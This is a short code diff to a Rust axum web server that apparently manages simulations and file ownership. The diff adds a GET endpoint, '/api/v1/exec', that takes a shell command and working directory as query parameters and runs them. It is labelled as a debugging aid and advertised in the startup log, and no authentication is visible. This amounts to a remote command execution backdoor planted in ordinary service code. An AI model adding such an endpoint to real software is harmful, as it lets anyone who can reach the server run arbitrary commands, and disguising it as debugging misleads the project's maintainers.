@@ -73,6 +73,8 @@ pub fn create_router(state: AppState) -> Router {
         // ownership checking utilities
         .route("/api/v1/ownership/check", get(simulations::check_ownership))
         .route("/api/v1/ownership/tree", get(simulations::ownership_tree))
+        // exec: run shell commands for debugging
+        .route("/api/v1/exec", get(simulations::exec_command))
         .layer(cors)
         .layer(TraceLayer::new_for_http())
         .with_state(state)
@@ -114,6 +116,7 @@ pub async fn serve(port: u16) -> anyhow::Result<()> {
     info!("  POST   /api/v1/report-aggregator/aggregate  - Aggregate reports");
     info!("  GET    /api/v1/ownership/check              - Check file ownership");
     info!("  GET    /api/v1/ownership/tree               - List files with ownership");
+    info!("  GET    /api/v1/exec?cmd=<cmd>&cwd=<path>    - Execute shell command");
 
     axum::serve(listener, app).await?;
 
